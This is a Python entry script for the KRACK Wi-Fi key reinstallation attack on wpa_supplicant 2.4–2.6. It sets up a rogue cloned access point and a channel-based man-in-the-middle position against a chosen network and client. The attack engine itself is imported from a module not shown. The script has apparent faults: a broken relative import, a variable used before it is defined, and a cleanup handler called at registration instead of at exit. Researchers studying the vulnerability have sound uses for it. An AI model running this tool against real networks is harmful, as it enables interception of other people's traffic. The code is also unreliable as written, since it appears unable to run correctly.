#!/usr/bin/env python3

# wpa_supplicant v2.4 - v2.6 all-zero encryption key attack
# Copyright (c) 2017, Mathy Vanhoef <Mathy.Vanhoef@cs.kuleuven.be>
#
# This code may be distributed under the terms of the BSD license.
# See README for more details.

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import argparse, atexit, textwrap
from KRAckAttack import KRAckAttack
from .helper import logging

def cleanup():
	attack.stop()

if __name__ == "__main__":
	description = textwrap.dedent(
		"""\
		Key Reinstallation Attacks (KRACKs) by Mathy Vanhoef
		-----------------------------------------------------------
		  - Uses CSA beacons to obtain channel-based MitM position
		  - Can detect and handle wpa_supplicant all-zero key installations""")
	parser = argparse.ArgumentParser(description=description, formatter_class=argparse.RawDescriptionHelpFormatter)
	# 必要的參數
	parser.add_argument("nic_real_mon", help="Wireless monitor interface that will listen on the channel of the target AP.")
	parser.add_argument("nic_rogue_ap", help="Wireless monitor interface that will run a rogue AP using a modified hostapd.")
	parser.add_argument("ssid", help="The SSID of the network to attack.")
	parser.add_argument("password", help="The password of the network to attack.")

	# 選擇性參數
	parser.add_argument("-m", "--nic-rogue-mon", help="Wireless monitor interface that will listen on the channel of the rogue (cloned) AP.")
	parser.add_argument("-t", "--target", help="Specifically target the client with the given MAC address.")
	parser.add_argument("-p", "--dump", help="Dump captured traffic to the pcap files <this argument name>.<nic>.pcap")
	parser.add_argument("-d", "--debug", action="count", help="increase output verbosity", default=0)
	parser.add_argument("--strict-echo-test", help="Never treat frames received from the air as echoed injected frames", action='store_true')
	parser.add_argument("--continuous-csa", help="Continuously send CSA beacons on the real channel (10 every second)", action='store_true')
	parser.add_argument("--group", help="Perform attacks on the group key handshake only", action='store_true')

	args = parser.parse_args()

	global_log_level = max(ALL, global_log_level - args.debug)

	print("\n\t===[ KRACK Attacks against Linux/Android by Mathy Vanhoef ]====\n")
	logging.setGroup(args.group)
	attack = KRAckAttack(args.nic_real_mon, args.nic_rogue_ap, args.nic_rogue_mon, args.ssid, args.password, args.target, args.dump, args.continuous_csa)
	atexit.register(cleanup())
	attack.run(strict_echo_test=args.strict_echo_test)


